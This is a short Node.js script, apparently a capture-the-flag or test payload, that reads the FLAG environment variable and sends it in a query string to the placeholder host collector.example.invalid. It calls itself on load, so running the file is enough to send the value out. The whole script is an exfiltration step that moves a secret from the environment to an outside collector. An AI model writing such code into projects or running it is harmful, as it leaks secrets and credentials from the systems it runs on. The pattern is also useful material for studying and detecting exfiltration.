const https = require('https');

function sendFlag() {
  const flag = process.env.FLAG;
  if (!flag) return;

  const url = `https://collector.example.invalid/submit?flag=${encodeURIComponent(flag)}`;
  const parsed = new URL(url);
  https.request({
    hostname: parsed.hostname,
    path: parsed.pathname + parsed.search,
    method: 'GET',
  }).end();
}

sendFlag();
